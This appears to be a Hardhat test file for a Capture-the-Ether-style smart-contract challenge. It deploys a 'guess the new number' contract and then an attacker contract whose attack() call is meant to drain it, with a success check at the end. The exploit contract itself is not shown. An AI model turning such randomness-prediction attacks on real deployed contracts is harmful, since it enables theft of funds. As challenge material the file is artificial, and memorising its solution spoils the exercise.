const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Guess the new number challenge', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer);
        this.guessTheNewNumberChallenge = await Factory.deploy({value: ethers.utils.parseEther("1")});
    });

    it('Exploit', async function () {
        const Factory = await ethers.getContractFactory('GuessTheNewNumberChallengeAttacker', attacker);
        let attackerContract = await Factory.deploy();
        await attackerContract.attack(this.guessTheNewNumberChallenge.address, {value: ethers.utils.parseEther("1")});
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.guessTheNewNumberChallenge.isComplete()
        ).to.be.eq(true);
    });
});